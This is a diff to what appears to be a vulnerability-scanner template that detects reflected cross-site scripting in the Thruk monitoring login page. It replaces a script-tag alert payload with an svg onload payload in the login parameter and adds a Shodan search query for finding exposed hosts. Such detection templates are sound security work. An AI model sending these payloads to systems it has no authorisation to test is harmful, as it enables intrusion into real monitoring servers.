@@ -1,12 +1,17 @@
 id: thruk-xss
 
 info:
-  name: Thruk Monitoring Webinterface - XSS
-  author: pikpikcu
+  name: Thruk Monitoring Webinterface - Cross-Site Scripting
+  author: pikpikcu,ritikchaddha
   severity: medium
+  description: |
+    Thruk login page is vulnerable to Reflected XSS via the login parameter at /thruk/cgi-bin/login.cgi.
   reference:
     - https://www.thruk.org/download.html
-  tags: xss,thruk
+  metadata:
+    verified: true
+    shodan-query: http.html:"Thruk"
+  tags: thruk,xss
 
 requests:
   - raw:
@@ -14,22 +19,20 @@ requests:
         POST /thruk/cgi-bin/login.cgi HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
-        Referer: {{Hostname}}/thruk/cgi-bin/login.cgi?thruk
 
-        referer=%2Fthruk&login=--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=Thruk+Monitoring+Webinterface
+        referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com&password=test&submit=Login
 
     matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-
       - type: word
-        part: body
         words:
-          - "</script><script>alert(document.domain)</script>"
+          - "<svg/onload=alert(document.domain)>\"@gmail.com') called at"
 
       - type: word
         part: header
         words:
           - "text/html"
+
+      - type: status
+        status:
+          - 500
